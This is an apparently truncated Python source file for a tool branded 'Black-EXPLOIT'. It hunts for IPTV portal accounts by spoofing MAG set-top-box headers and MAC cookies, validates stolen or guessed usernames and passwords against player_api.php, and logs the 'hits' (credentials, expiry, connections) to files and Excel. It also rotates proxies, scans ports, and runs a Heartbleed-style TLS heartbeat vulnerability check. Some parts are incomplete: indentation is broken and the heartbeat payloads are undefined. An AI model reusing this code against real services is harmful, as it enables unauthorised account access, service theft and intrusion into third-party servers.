# -*- coding: utf-8 -*-
import copy
import functools
import json
import string
from datetime import datetime
import threading
from queue import PriorityQueue
import pip
import glob
try:
    import colorama
except:
    pip.main(['install', 'coloroma'])
from colorama import Fore,Back, init
import os
from socket import AF_INET, socket
from socket import SOCK_STREAM
from socket import socket
import sys
import struct
import ipaddress
import time
from concurrent.futures import ThreadPoolExecutor, thread
from urllib.parse import urlparse
import requests
import select
import re
import codecs
from optparse import OptionParser
from _socket import SHUT_RDWR
from collections import deque        
import datetime
import hashlib
import platform
import random
from datetime import date
import configparser
from os import remove
import urllib.parse
from urllib.parse import urlparse
try:
    import m3u8
except:
    pip.main(['install', 'm3u8'])
    import m3u8
try:
    import colorama
except:
    pip.main(['install', 'colorama'])
import urllib3
from colorama import Fore,Back, init
init()
try:
    import androidhelper as sl4a

    ad = sl4a.Android()
except:
    pass

try:
    import threading
except:
    pass
import pip
from contextlib import contextmanager

@contextmanager
def suppress_stdout_stderr():
    with open(os.devnull, 'w') as fnull:
        oldout, olderr = sys.stdout, sys.stderr
        try:
            sys.stdout, sys.stderr = fnull, fnull
            yield
        finally:
            sys.stdout, sys.stderr = oldout, olderr

packages = ['requests', 'requests[socks]', 'sock', 'socks', 'PySocks', 'openpyxl', 'requests[openpyxl]']

for package in packages:
    try:
        __import__(package)
    except ImportError:
        with suppress_stdout_stderr():
            pip.main(['install', package])
from openpyxl.styles import PatternFill
from openpyxl.worksheet.dimensions import ColumnDimension, DimensionHolder
from openpyxl.utils import get_column_letter
from openpyxl import Workbook
from openpyxl import load_workbook
import traceback
from concurrent.futures import ThreadPoolExecutor
from socket import socket, AF_INET, SOCK_STREAM
from _socket import SHUT_RDWR

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

try:
    import cfscrape

    sesq2 = requests.Session()
    ses2 = cfscrape.create_scraper(sess=sesq2)
except:
    ses2 = requests.Session()

scanPORTTYPE="LOCAL" 
debug=False
totalHilosConsumidores=40
totalHilosProductores=400
_puertoINICIO_SCAN=0
_puertoFIN_SCAN=30000
lock = threading.Lock()
lockContenedorDatos=threading.Lock()
version=1.16
PUERTO_INICIO_SCAN=0
PUERTO_FIN_SCAN=30000
scanPORTTYPE="LOCAL" 
SCAN_LENTO=0
SCAN_NORMAL=1
SCAN_PORTS_LOCAL=0
SCAN_PORTS_WEB=1
DEFAULT_VULNERABLES_PORTS={8443,25463,443,2082,8081}
API_NICK_DEFAULT=""

listaMacs=[]
portalConcatString = "portal.php"
useragent = "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
realblue=""
media = 0
debug=False
version="V8.1 BLACK"



decode_hex = codecs.getdecoder('hex_codec')
def decoceStringToHEX(entrada):
    return decode_hex(entrada.replace(' ', '').replace('\n', ''))[0]
def hexdump(s):    
    for b in range(0, len(s), 16):
        lin = [c for c in s[b: b + 16]]
        hxdat = ' '.join('%02X' % c for c in lin)
        pdat = ''.join(chr(c) if 32 <= c <= 126 else '' for c in lin)
        
def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = b''
    try:
        remain = length
        while remain > 0:
            rtime = endtime - time.time()
            if rtime < 0:
                return None
            r, w, e = select.select([s], [], [], 5)
            if s in r:
                data = s.recv(remain)                
                if not data:
                    return None
                rdata += data
                remain -= len(data)
        return rdata
    except Exception as errp:
        return None
def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        return None, None, None    
    return typ, ver, pay
def hit_hb(s,_url,_port):
    data = decoceStringToHEX(hb)
    s.send(data)
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:            
            return False
        if typ == 24:
            if debug:
                hexdump(pay)
            if len(pay) > 3:
                puerto=str(_port)
                cadena=Fore.GREEN+'\t\t\tServer ist anfällig!-->'+_url+":"+puerto+ Fore.RESET
                print(cadena)
            else:
                print('\t\tServer hat fehlerhafte Daten verarbeitet (hello), hat aber keine zusätzlichen Daten zurückgegeben.')
            return True
        if typ == 21:
            print('\t\tEmpfange ALARM:')
            return False
def checkHB(_url, port: int):
    global hello
    _socket = socket(AF_INET, SOCK_STREAM)
    try:
        _socket.connect((_url, port))
        sys.stdout.flush()
        _socket.send(decoceStringToHEX(hello))
        sys.stdout.flush()
        _continue = True
        while _continue:
            typ, ver, pay = recvmsg(_socket)
            if (typ != None):
                time.sleep(1)
                if typ == 22 and pay[0] == 0x0E:
                    sys.stdout.flush()
                    data = decoceStringToHEX(hb)
                    _socket.send(data)
                    if (hit_hb(_socket,_url,port)):
                        _socket.close()
                        return True
            else:
                _socket.close()
    except Exception as errp:
        _socket.close()
        return False

    def ckeck_simple_IP_Vulnerable(_IP, puerto):
        esVulnerable = checkHB(_IP, puerto)
        return esVulnerable

    def sacarPuertos_IP(IP, _scanTYPE, _scaneoLento: bool):
        miPortScanner = PortScanner()
        listapuertos = miPortScanner.port_scan(IP, range(PUERTO_INICIO_SCAN, PUERTO_FIN_SCAN), _scanTYPE, _scaneoLento)
        return listapuertos

    def ckeck_simple_IP_Vulnerable_default_PORTS(self, _IP):
        print("Start des Scans der Standardports",EOF=' ')
        for puerto in DEFAULT_VULNERABLES_PORTS:
            esVulnerable = checkHB(_IP, puerto)
            if (esVulnerable):
                return puerto
        return -1
    
    def check_IP_Vulnerable(_IPS: dict, _scanTYPE_ATTACK, slow_port_Scan: bool):
        listaVulnerables = {}
        for ip in _IPS:
            puertoDefectoVulnerable = ckeck_simple_IP_Vulnerable_default_PORTS(
                ip)  
            if puertoDefectoVulnerable == -1:
                puertos = sacarPuertos_IP(ip, _scanTYPE_ATTACK, slow_port_Scan)
                if len(puertos) > 0:
                    for puerto in puertos:
                        resultado = ckeck_simple_IP_Vulnerable(ip, puerto)
                        listaVulnerables[ip] = puerto
                        print("IP:", ip, " Port:", puerto, "Ist anfällig:", resultado)
                        break;  
            else:
                listaVulnerables[ip] = puertoDefectoVulnerable

        return listaVulnerables

class PortScanner:
        header1 = {
            "Host": "www.ipfingerprints.com",
            "Connection": "keep-alive",
            "Accept": "application/json, text/javascript,*/*; q=0.01",
            "Content-Type": f"application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36",
            "sec-ch-ua-platform": "\"Windows\"",
            "Origin": f"https://www.ipfingerprints.com",
            "Referer": f"https://www.ipfingerprints.com/portscan.php",
            "Accept-Language": "es-US,es-419;q=0.9,es;q=0.8",
            "Accept-Encoding": "gzip, deflate"
        }

        def tratarSalidaPuertos(self, _entrada: dict):            
            separada: list
            puertos = []
            cadena = _entrada['portScanInfo']
            separada = cadena.split("\n")

            for elemento in separada:
                if (elemento.find("tcp") >= 0):
                    if (elemento.find("open") >= 0):
                        pos = elemento.find("/")
                        puertos.append(int(elemento[:pos]))
            return puertos

        def createCoockiePanel(self, _host, _startport, _endport):
            coockieDat = {
                "remoteHost": _host,
                "start_port": _startport,
                "end_port": _endport,
                "normalScan": "Yes",
                "scan_type": "connect",
                "ping_type": "none"
            }
            return coockieDat



        def searchOpenPorts_WEB(self, initPort: int, finishPort: int, ipServerToScan: str):
            print(Fore.GREEN, "Scanne Ports mit WEB-Methode:", ipServerToScan, Fore.RESET)

            parametros = self.createCoockiePanel(ipServerToScan, str(initPort), str(finishPort))
            try:
                dat = requests.post("https://www.ipfingerprints.com/scripts/getPortsInfo.php", headers=self.header1,
                                    data=parametros,
                                    timeout=300)  
                puertos = self.tratarSalidaPuertos(dat.json())
                return puertos
            except Exception as errp:
                print("Fehler beim Aufrufen der URL zur Porterkennung:", errp)
                return []

        
        def test_port_number(self, host, port):
            
            with socket(AF_INET, SOCK_STREAM) as sock:
                
                sock.settimeout(5)                
                try:                    
                    sock.connect((host, port))
                    if debug:
                        cadena="\t\tPort gefunden für:"+ host+ ":"+ str(port)
                        print(cadena)                    
                    sock.shutdown(SHUT_RDWR)
                    sock.close()
                    return True
                except:                    
                    sock.close()
                    return False

        def port_scan(self, host, port: range, _scanTYPE,_scaneoLento:bool):
            if _scanTYPE == SCAN_PORTS_WEB:
                return self.searchOpenPorts_WEB(port.start, port.stop, host)
            else:
                return self.test_port_numberLOCAL(host, port, _scaneoLento)
        
        def test_port_numberLOCAL(self, host, ports, scaneLento:bool):
            print(f'\t\tScanne Ports mit lokaler Methode:{host}...')            
            totalHilos = len(ports)
            if scaneLento == True:
                totalHilos = 1            
            with ThreadPoolExecutor(totalHilos) as executor:
                results = executor.map(self.test_port_number, [host] * len(ports), ports)                
                openPorts = []
                for port, is_open in zip(ports,
                                         results):  
                    if is_open:
                        openPorts.append(port)
                if (debug):
                    print("Ports:", openPorts)
                return openPorts


class HitData:
    portal = ""
    mac = ""
    url = ""
    m3uURL = ""
    user = ""
    password = ""
    caducidad = ""
    conexionesActivas = ""
    maxConexiones = ""
    timezone = ""
    playerlink = ""
    print("\033[1;32m┌───────────────────────\033[0m")  # Grüner fetter Rahmen
    print("\033[1;33m│ INGRESE SU NICK \033[0m")  # Gelbe fette Schrift
    print("\033[1;32m└───────────────────────\033[0m")  # Grüner fetter Rahmen
    nickn = input()
    mensaje = "Black-EXPLOIT"
    print("\033[1;32m┌───────────────────────┐\033[0m")  # Grüner fetter Rahmen
    print("\033[1;33m│ " + mensaje.center(21) + " │\033[0m")  # Gelbe fette Schrift
    print("\033[1;32m└───────────────────────┘\033[0m")  # Grüner fetter Rahmen
    livelist = ""
    vodlist = ""
    serieslist = ""
    panel = ""
    port = ""
    real = ""
    programmer = "code by Mr.Black"
    vpn = ""
    accountType = "no data"
    m3uValid=""
    serial=""
    shortSerial=""
    deviceID1=""
    deviceID2=""
    os = platform.system() + " " + platform.release()
    cpu = platform.processor()

    def setData(self, portalName: str, nickn: str, mac: str, url: str, m3uUrl: str, user: str, password: str,
                ficheroAsociado: str, mensaje: str, puerto: str, liveList, serieList, vodList):
        self.portal = portalName
        self.panel = portalName
        self.mac = mac
        self.url = url
        self.m3uURL = m3uUrl
        self.user = user
        self.password = password
        self.ficherosSalida = ficheroAsociado
        self.livelist = liveList
        self.vodlist = vodList
        self.serieslist = serieList
        self.port = puerto

    def __str__(self):
        output = """
    ┌───────────────────────
    │   BLACK-EXPLOIT
    │Hits von """ + str(self.nickn) + """   
    │CODE VON: """ + self.programmer + """  
    │OS: """ + self.os + """
    │CPU: """ + self.cpu + """
    │Host: http://""" + self.panel + """/c/
    │Real: """ + self.url + """
    │Port: """ + self.port + """
    │Scan-Datum: """ + datetime.datetime.now().strftime("%d-%m-%Y %H:%M:%S") + """
    │User: """ + self.user + """
    │Pass: """ + self.password + """
    │Exp: """ + self.caducidad + """ 
    │ActCon: """ + self.conexionesActivas + """
    │MaxCon: """ + self.maxConexiones + """ 
    │TimeZone: """ + self.timezone + """
    │M3UValid: """+self.m3uValid+"""
    │M3U url: """ + self.m3uURL
        if (self.serial != ""):
            output= output+"""
    │Serial: """ + self.serial+"""
    │SerialShort: """ + self.shortSerial+"""
    │Device1: """ +self.deviceID1+"""
    │Device2: """ +self.deviceID2+"""
    │"""
        if (self.livelist != ""):
            output = output + """
    │Kanäle
    │""" + str(self.livelist)
        output += "└───────────────────────"
        return output

    def getSortOutput(self):
        output = """
    ┌───────────────────────
    │   BLACK-EXPLOIT
    │Hits von """ + str(self.nickn) + """   
    │Host: http://""" + self.panel + """/c/
    │Real: """ + self.url + """
    │MAC: """ + self.mac + """
    │Exp: """ + self.caducidad + """ 
    │""" + self.accountType + """
    │Country: """ + self.vpn + """
    │M3UValid: """+self.m3uValid+"""
    │M3U url: """ + self.m3uURL + """
    │ConexMax: """ +  self.maxConexiones + """
    │Canales: """ + str(self.livelist)
        output += "└───────────────────────"
        return output
class DatosServerM3U:

    puertoBaseSERVER=0
    host=""
    panelM3u=""
    protocoloSERVER= "http"
    canal=""
    panelHost=""
    panelProtocolo="http"
    m3uURL=""
    panelPuerto=0
    misHeaders = {
        'Accept': '*/*',
        'Accept-Language': 'de',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537',
        'Range': 'bytes=0-'
    }
    
    def printInfoServer(self):
        print("Panel-Host-->", self.panelHost)
        print("Panel-Port--->",self.panelPuerto)
        print("Server-Port--->", self.puertoBaseSERVER)
        print("\tURL des Panels-->",self.m3uURL)
        if self.puertoBaseSERVER==None:
            self.puertoBaseSERVER=80
        print("\tEndserver:", self.protocoloSERVER + "://" + self.host + ":" + str(self.puertoBaseSERVER))
        print("\tHost Servidor Final-->", self.host)
        print("\tServidor Final protocolo-->", self.protocoloSERVER)
        print("\tCanal utilizado-->", self.canal)

    def __str__(self):
        return self.panelProtocolo + "://" + self.panelHost + "--->" + self.protocoloSERVER + "://" + self.host + ":" + str(
            self.puertoBaseSERVER)

    def extraerCanalFromM3U(self,_m3u:str):
        try:
            _m3u=_m3u.replace("_plus","")
            m3u8_obj = m3u8.load(_m3u,headers=self.misHeaders)
            playlist = [el['uri'] for el in m3u8_obj.data['segments']]
            sesion = requests.Session()
            canal = playlist[50]
            return canal
        except Exception as errp:
            print(Fore.RED,"Error al acceder a m3u (War das eine M3U?):",errp,Fore.RESET)
            return ""

 
    def extraerServerFinal(self,_m3uURL):
        try:
            canal=self.extraerCanalFromM3U(_m3uURL)
            self.m3uURL=_m3uURL
            if canal!="":
                panelParser=urlparse(_m3uURL)
                self.panelHost=panelParser.netloc.split(":")[0] 
                self.panelProtocolo=panelParser.scheme
                self.panelPuerto=panelParser.port
                sesion=requests.Session()
                respuesta = sesion.get(url=canal, stream=False, allow_redirects=False)
                self.canal=canal
                if 'Location' in respuesta.headers:
                    miparser=urlparse(respuesta.headers["Location"])
                    self.panelM3u=_m3uURL
                    self.host=miparser.hostname
                    self.puertoBaseSERVER=miparser.port
                    self.protocoloSERVER=miparser.scheme
                    return self
            
            miparser = urlparse(_m3uURL)
            self.panelM3u = _m3uURL
            if miparser.hostname==None:
                self.host=_m3uURL
                self.panelHost = _m3uURL
            else:
                self.host = miparser.hostname
                self.panelHost = miparser.hostname
            if miparser.port==None:
                self.puertoBaseSERVER=80
                self.panelPuerto=80
            else:
                self.puertoBaseSERVER = miparser.port
                self.panelPuerto= miparser.port
            if miparser.scheme==None:
                self.panelProtocolo = ""
                self.protocoloSERVER = ""
            else:
                self.panelProtocolo=miparser.scheme
                self.protocoloSERVER=miparser.scheme
            return self
        except Exception as errp:
            print("Fehler:",errp)

    def __eq__(self, other):
        return self.m3uURL == other.m3uURL

    def __gt__(self, other):
        return self.m3uURL > other.m3uURL
  

class M3U_UTILS:
    HEADER1_M3U = {
        "Cookie": "stb_lang=de; timezone=Europe%2FIstanbul;",
        "X-User-Agent": "Model: MAG254; Link: Ethernet",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3",
    }
    def getHeaderM3U_withHOST(self,host):
        HEADER1_m3u = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Accept-Encoding": "gzip,deflate",
            "Accept-Language": "es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
            "Connection": "keep-alive",
            "Host": host,
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.76"
        }
        return HEADER1_m3u
    
    def extractDataFromList(self,user: str, passw: str, reponseMessage: str, panel: str, hitData: HitData):
        try:
            hitData.panel = panel
            hitData.user = user
            hitData.password = passw
            acon = ""
            acon = reponseMessage.split('active_cons":')[1]
            acon = acon.split(',')[0]
            acon = acon.replace('"', "")
            hitData.conexionesActivas = acon
            mcon = reponseMessage.split('max_connections":')[1]
            mcon = mcon.split(',')[0]
            mcon = mcon.replace('"', "")
            hitData.maxConexiones = mcon
            timezone = reponseMessage.split('timezone":"')[1]
            timezone = timezone.split('",')[0]
            timezone = timezone.replace("\/", "/")
            hitData.timezone = timezone
            realm = reponseMessage.split('url":')[1]
            realm = realm.split(',')[0]
            realm = realm.replace('"', "")
            hitData.real = realm
            port = reponseMessage.split('port":')[1]
            port = port.split(',')[0]
            port = port.replace('"', "")
            hitData.port = port
            timeInfo = reponseMessage.split('exp_date":')[1]
            timeInfo = timeInfo.split(',')[0]
            timeInfo = timeInfo.replace('"', "")
            if timeInfo == "null":
                hitData.caducidad = "Unlimited"
            else:
                hitData.caducidad = (datetime.datetime.fromtimestamp(int(timeInfo)).strftime('%Y-%m-%d %H:%M:%S'))
            hitData.outputFormats = (reponseMessage.split('allowed_output_formats":')[1]).split('}')[0]
        except Exception as err:
            print("Fehler bei Senderliste extrahieren:", err)

    
    def extractChannelListM3U_FromUSER_PASS(self, panel, user, passw):
        url="http://" + panel + "/player_api.php?username=" + user + "&password=" + passw + "&action=get_live_categories"
        
        try:
            ses=requests.session()
            res = ses.get(url, headers=self.getHeaderM3U_withHOST(panel), timeout=15, verify=False)
            return self.createChannelList(str(res.text))
        except Exception as errp:
            return "Fehler beim Erstellen von Kanälen:",errp

    
    def createChannelList(self, listlink):        
        canal = ""
        categoria = ""
        if listlink.count('category_name":"') > 1:
            for i in listlink.split('category_name":"'):
                try:
                    canal = str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/', '/').replace(
                        '{', '').replace('[', '')
                except:
                    canal = ""
                categoria = categoria + canal + " 🔛 "
            return categoria
        else:
            return "<<no_data>>"

def url(cid, panel, portalConcatString, mac):
    url7 = "http://" + panel + "/" + portalConcatString + "?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/" + str(
        cid) + "_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml&mac=" + mac
    return url7

def separarUserPass(entrada:str):
    try:
        protocolo="http"
        if (entrada.find("https"))>=0:
            protocolo="https"
        entrada = entrada.replace("/", "")
        separador = "get.php"
        separado = entrada.split(separador)
        url = separado[0].replace("https:", "")
        url = url.replace("http:", "")
        separador = "username="
        separado = entrada.split(separador)
        separado = separado[1].split("password=")
        user = separado[0].replace("&","")
        separado = separado[1].split("&")
        password = separado[0]
        return protocolo,url,user, password
    except:
        return ""

def checkFullM3U_URL(entradaURL:str,_session):
    protocolo,url,user,passw=separarUserPass(entradaURL)
    urlEntrada=url    
    urlPlayerInfo = "http://" + url + "/player_api.php?username=" + str(user) + "&password=" + str(passw)    
    try:
        res = _session.get(urlPlayerInfo, headers=hea3(url), timeout=(2, 10), allow_redirects=False, stream=True)
        if res.status_code==200:
            datos=json.loads(res.text)
            if (datos["user_info"]["auth"]==0):
                return "KO","","",""
            urlReal=datos["server_info"]["url"]+":"+datos["server_info"]["port"]
            urlReal=urlReal.replace("https://","")
            urlReal = urlReal.replace("http://", "")
            url=urlReal
            puerto=datos["server_info"]["port"]
            return "OK","","",""
        else:
            return "KO","","",""
    except Exception as errp:        
        return "KO", "", "", ""


def m3uCheck(cid, user, pas, plink,ses):

    try:
        url = 'http' + "://" + plink + '/live/' + str(user) + '/' + str(pas) + '/' + str(cid) + '.ts'
        res = ses.get(url, headers=hea3(plink), timeout=(2, 5), allow_redirects=False, stream=True)
        if res.status_code == 302:
            return "OK"
        else:
            print("URL existiert nicht:",url)
    except Exception as errp:        
        return "KO"
    return "KO"

def m3uCheck_sinMAC(cid, user, pas, plink,ses):

    try:
        url = 'http' + "://" + plink + '/live/' + str(user) + '/' + str(pas) + '/' + str(cid) + '.ts'
        res = ses.get(url, headers=hea3(plink), timeout=(2, 5), allow_redirects=False, stream=True)
        if res.status_code == 302:
            return "OK"
        else:
            print("URL existiert nicht:",url)
    except Exception as errp:        
        return "KO"
    return "KO"

def hea1(macs, panel):
    HEADERA = {
        "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3",
        "Referer": "http://" + panel + "/c/",
        "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Cookie": "mac=" + macs + "; stb_lang=de; timezone=Europe/Paris;",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "Keep-Alive",
        "X-User-Agent": "Model: MAG254; Link: Ethernet",
    }
    return HEADERA


def hea2(macs, panel, token):
    HEADERd = {
        "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3",
        "Referer": "http://" + panel + "/c/",
        "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Cookie": "mac=" + macs + "; stb_lang=de; timezone=Europe/Madrid;",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "Keep-Alive",
        "X-User-Agent": "Model: MAG254; Link: Ethernet",
        "Authorization": "Bearer " + token,
    }
    return HEADERd


def hea3(panel):
    hea = {
        "Icy-MetaData": "1",
        "User-Agent": "Lavf/57.83.100",
        "Accept-Encoding": "identity",
        "Host": panel,
        "Accept": "*/*",
        "Range": "bytes=0-",
        "Connection": "close",
    }
    return hea


def month_string_to_number(ay):
    m = {
        'jan': 1,
        'feb': 2,
        'mar': 3,
        'apr': 4,
        'may': 5,
        'jun': 6,
        'jul': 7,
        'aug': 8,
        'sep': 9,
        'oct': 10,
        'nov': 11,
        'dec': 12
    }
    s = ay.strip()[:3].lower()

    try:
        out = m[s]
        return out
    except:
        raise ValueError('Not a month')


def dateAdjust(trh):
    month = str(trh.split(' ')[0])
    day = str(trh.split(', ')[0].split(' ')[1])
    year = str(trh.split(', ')[1])
    month = str(month_string_to_number(month))    
    trai = str(day) + '/' + str(month) + '/' + str(year)
    my_date = str(trai)
    if 1 == 1:
        d = date(int(year), int(month), int(day))
        sontrh = time.mktime(d.timetuple())
        out = (int((sontrh - time.time()) / 86400))
        return out
    


class OutpotHitsFiles:
    outputMainFile = ""
    salidaFiltro = ""
    salidaReducida = ""
    salidaHitsM3U=""
    ficheroExcel = ""
    


class URLdeclare:
    url1 = ""
    url2 = ""
    url3 = ""
    url4 = ""
    url5 = ""
    url6 = ""
    liveusrl = ""
    vodurl = ""
    seriesurl = ""
    realblue = ""
    macs = ""
    panel = ""

 



def vpnip(ip, miSession):
    urlGEOIP = "http://ip-api.com/json/" + ip
    vpnip = ""
    veri = ""
    try:
        res = miSession.get(urlGEOIP, timeout=7, verify=False)
        veri = str(res.text)
        if not '404 page' in veri:
            vpnips = veri.split('"country":"')[1]
            vpnc = veri.split('"city":"')[1].split('"')[0]
            vpn = vpnips.split('"')[0] + ' / ' + vpnc
        else:
            vpn = "Not Invalid"
    except:
        vpn = "Not Invalid"
    return vpn



def hitprint(mac, trh, portal):
    print('🇭 🇮 🇹 \n  ' + str(mac) + '\n  ' + str(trh) + '\n  ' + str(portal))


def searchString(cadenasBusqueda, origen):    
    encontradas = [x for x in cadenasBusqueda.upper().split() if origen.upper().find(x) >= 0]
    if (len(encontradas) > 0):
        return True
    else:
        return False


class ExcelOut:
    wb = Workbook
    excelCreated = False
    nombreFicheroSalida = ""

    def __init__(self, nombreSalida: str):
        self.nombreFicheroSalida = nombreSalida

    def createExcel(self, nombreFichero):
        self.nombreFicheroSalida = nombreFichero
        try:
            self.wb = load_workbook(nombreFichero)
        except:
            self.wb = Workbook()  
            self.excelCreated = True
            ws = self.wb.create_sheet(index=0, title="hits")
            ws.oddHeader.center.text = "fffffffffffffffffff"
            ws.oddHeader.center.size = 14
            ws.oddHeader.center.font = "Tahoma,Bold"
            ws.oddHeader.center.color = "CC3366"
            ws.cell(row=1, column=1).fill = PatternFill(start_color='FFEE08', end_color='FFEE08', fill_type='solid')
            ws.cell(row=1, column=1).value = 'MAC'
            ws.cell(row=1, column=2).fill = PatternFill(start_color='FFEE08', end_color='FFEA08', fill_type='solid')
            ws.cell(row=1, column=2).value = 'URL'
            ws.cell(row=1, column=3).fill = PatternFill(start_color='FFEE08', end_color='FFEB08', fill_type='solid')
            ws.cell(row=1, column=3).value = 'M3U_URL'
            ws.cell(row=1, column=4).fill = PatternFill(start_color='FFEE08', end_color='FFEC08', fill_type='solid')
            ws.cell(row=1, column=4).value = 'USUARIO'
            ws.cell(row=1, column=5).fill = PatternFill(start_color='FFEE08', end_color='FFED08', fill_type='solid')
            ws.cell(row=1, column=5).value = 'PASSWORD'
            ws.cell(row=1, column=6).fill = PatternFill(start_color='FFEE08', end_color='FFED08', fill_type='solid')
            ws.cell(row=1, column=6).value = 'STATUS ACCOUNT'
            ws.cell(row=1, column=6).fill = PatternFill(start_color='FFEE08', end_color='FFED08', fill_type='solid')
            ws.cell(row=1, column=6).value = 'COUNTRY'
            ws.cell(row=1, column=6).fill = PatternFill(start_color='FFEE08', end_color='FFED08', fill_type='solid')
            ws.cell(row=1, column=6).value = 'CANALES'
            dim_holder = DimensionHolder(worksheet=ws)
            dim_holder[get_column_letter(1)] = ColumnDimension(ws, min=1, max=5, width=20)
            dim_holder[get_column_letter(2)] = ColumnDimension(ws, min=1, max=5, width=50)
            dim_holder[get_column_letter(3)] = ColumnDimension(ws, min=1, max=5, width=70)
            dim_holder[get_column_letter(4)] = ColumnDimension(ws, min=1, max=5, width=20)
            dim_holder[get_column_letter(5)] = ColumnDimension(ws, min=1, max=5, width=20)
            dim_holder[get_column_letter(6)] = ColumnDimension(ws, min=1, max=5, width=20)
            ws.column_dimensions = dim_holder
            self.wb.save(self.nombreFicheroSalida)

    
    def writetoExcel(self, mihitData: HitData):
        if not self.excelCreated:
            self.createExcel(self.nombreFicheroSalida)
            self.excelCreated = True
        try:  
            ws = self.wb["hits"]
        except Exception as err:
            print("****Fehler beim schreiben der Excel-Datei:", err, "----Hoja:", self.datosSalida.ficheroExcel)
            
        try:
            tempURL = "http://" + mihitData.panel + "/c/"  
            rows = (mihitData.mac, tempURL, mihitData.m3uURL, mihitData.user, mihitData.password, mihitData.accountType,
                    mihitData.vpn, mihitData.livelist)
            ws.append(rows)
            self.wb.save(self.nombreFicheroSalida)
        except Exception as err:
            print("Fehler beim schreiben der Excel-Datei:", err)


class ScannerProxies:
    SOCKS5 = 1
    SOCKS4 = 2
    HTTP = 3
    IPVANISH = 4
    proxiesFile: str
    proxiesList: []
    totalProxies = 0
    lastGivenProxy = 0
    httpProxy = "http:socks5"
    httsProxyType = ""
    proxyType = 0  
    StartedTime = time.time()

    def __init__(self, _proxiesFile, _proxyType):
        self.proxiesFile = _proxiesFile
        self.proxyType = _proxyType

    
    def loadProxiesFromFile(self):
        openproxyfile = open(self.proxiesFile, "r")
        self.proxiesList = openproxyfile.readlines()
        self.totalProxies = (len(self.proxiesList) - 1)         
        host = ""
        for i in range(0, self.totalProxies):
            try:
                if ((self.proxyType == ScannerProxies.IPVANISH) or (self.proxyType == ScannerProxies.SOCKS5)):
                    self.proxiesList[i] = self.proxiesList[i].replace('\n', '')
                    host = self.proxiesList[i].split(':')[0].replace(' ', '')  
                    port = self.proxiesList[i].split(':')[1].replace(' ', '')  
                    proxies = {'http': 'socks5://' + host + ':' + port, 'https': 'socks5://' + host + ':' + port}
                    if (self.proxyType == ScannerProxies.IPVANISH):
                        user = self.proxiesList[i].split(':')[2].replace(' ', '')
                        passw = self.proxiesList[i].split(':')[3].replace(' ', '')
                        proxies = {'http': 'socks5://' + user.replace(' ', '') + ':' + passw + '@' + host + ':' + port,
                                   'https': 'socks5://' + user + ':' + passw + '@' + host + ':' + port}
                else:
                    if (self.proxyType == ScannerProxies.SOCKS4):
                        self.proxiesList[i] = self.proxiesList[i].replace('\n', '')
